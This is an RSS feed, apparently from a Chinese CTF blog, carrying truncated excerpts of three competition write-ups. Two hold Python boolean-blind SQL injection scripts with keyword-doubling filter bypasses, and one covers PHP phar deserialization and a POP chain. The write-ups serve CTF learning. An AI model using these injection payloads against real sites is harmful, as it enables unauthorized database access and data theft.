<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>phar on wh1sper</title>
    <link>https://anthem-whisper.github.io/tags/phar/</link>
    <description>Recent content in phar on wh1sper</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Mon, 04 Jan 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/phar/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>纵横杯 Writeup by X1cT34m</title>
      <link>https://anthem-whisper.github.io/p/%E7%BA%B5%E6%A8%AA%E6%9D%AF-writeup-by-x1ct34m/</link>
      <pubDate>Mon, 04 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/%E7%BA%B5%E6%A8%AA%E6%9D%AF-writeup-by-x1ct34m/</guid>
      <description>web easyci 考点：MySQL读写文件
和巅峰极客的前端一样，而且发现也是布尔盲注，一阵狂喜；
fuzz一番竟然没有任何过滤
exp:
#python3 import requests import time host = &amp;#39;http://eci-2zegnayqf8pwz72ze2yw.cloudeci1.ichunqiu.com/public/index.php/home/login&amp;#39; def mid(bot, top): return (int)(0.5*(top+bot)) def transToHex(flag): res = &amp;#39;&amp;#39; for i in flag: res += hex(ord(i)) res = &amp;#39;0x&amp;#39; + res.replace(&amp;#39;0x&amp;#39;, &amp;#39;&amp;#39;) return res def sqli(): name = &amp;#39;&amp;#39; for j in range(1, 2000): top = 126 bot = 32 while top &amp;gt; bot: #babyselect = &amp;#39;(database())&amp;#39;#p3rh4ps babyselect = &amp;#39;password&amp;#39;#c3762483bc73d0b7943156d43911ce38-&amp;gt;HEIHEIHEIHEI #babyselect = &amp;#34;&amp;#34; payload = &amp;#34;0&amp;#39;||ascii(substr({},{},1))&amp;gt;{}#&amp;#34;.</description>
    </item>
    
    <item>
      <title>2020“巅峰极客”</title>
      <link>https://anthem-whisper.github.io/p/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</link>
      <pubDate>Sun, 27 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/2020%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</guid>
      <description>babyphp2 考点：phar反序列化、pop链、compress.zlib://phar://绕过^phar
Paper：https://paper.seebug.org/680/
题目一开始有www.zip给了源代码，下载过来审计;
大概是有三个功能：文件上传、文件读取、SQL查询（登录框）
phar反序列化 我们可以看到class.php里面有很多的类，可以想到可能存在反序列化，但是在源码里面没有unserialize的操作。不过，他有一个功能是文件上传，那么我们自然而然的想到了phar反序列化。
class.php
&amp;lt;?phperror_reporting(0);session_start();class User{public $id;public $age=null;public $nickname=null;public $backup;public function login() {if(isset($_POST[&#39;username&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;password&#39;])){$mysqli=new dbCtrl();$this-&amp;gt;id=$mysqli-&amp;gt;login();if($this-&amp;gt;id){$_SESSION[&#39;id&#39;]=$this-&amp;gt;id;$_SESSION[&#39;login&#39;]=1;echo &amp;quot;你的ID是&amp;quot;.$_SESSION[&#39;id&#39;];echo &amp;quot;你好！&amp;quot;.$_SESSION[&#39;token&#39;];echo &amp;quot;&amp;lt;script&amp;gt;window.location.href=&#39;upload.php&#39;&amp;lt;/script&amp;gt;&amp;quot;;}}}public function upload(){$uploader=new Upload();$uploader-&amp;gt;upload();}public function read(){$reader=new reader();$reader-&amp;gt;read($_POST[&#39;filename&#39;]);}public function __toString(){$this-&amp;gt;nickname-&amp;gt;backup=$this-&amp;gt;backup;$user = new User();$user-&amp;gt;id = $_SESSION[&#39;id&#39;];$user-&amp;gt;nickname = $_SESSION[&#39;token&#39;];return serialize($user);}}class dbCtrl{public $hostname=&amp;quot;127.</description>
    </item>
    
    <item>
      <title>WHUCTF2020</title>
      <link>https://anthem-whisper.github.io/p/whuctf2020/</link>
      <pubDate>Sun, 24 May 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/whuctf2020/</guid>
      <description>武汉大学的CTF，难的简单的都有，最近比赛是真滴多，打完金盆洗手了
 Easy_sqli 考点：bool盲注，双写绕过
简单，没啥好讲的
#wh1sperimport requestshost = &#39;http://218.197.154.9:10011/login.php#&#39;def mid(bot, top):return (int)(0.5 * (top + bot))def sqli():name = &#39;&#39;for j in range(1, 250):top = 126bot = 32while 1:babyselect = &#39;(seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w)&#39;#select = &amp;quot;1&#39; oorr ascii(substr(&amp;quot;+babyselect+&amp;quot;,{},1))&amp;gt;{} #&amp;quot;.format(j, mid(bot, top))data = {&amp;quot;user&amp;quot;: select, &amp;quot;pass&amp;quot;: &amp;quot;a&amp;quot;}r = requests.post(url=host, data=data)#print(data)if &#39;Login success!&#39; in r.text: # 成功if top - 1 == bot: # top和bot相邻，说明name是topname += chr(top)print(name)breakbot = mid(bot, top) # 成功就上移botelse: # 失败if top - 1 == bot: # top和bot相邻，加上失败，说明name是botname += chr(bot)print(name)breaktop = mid(bot, top) # 失败就下移topif __name__ == &#39;__main__&#39;:sqli()WHUCTF{r3lly_re11y_n0t_d1ffIcult_yet?</description>
    </item>
    
  </channel>
</rss>
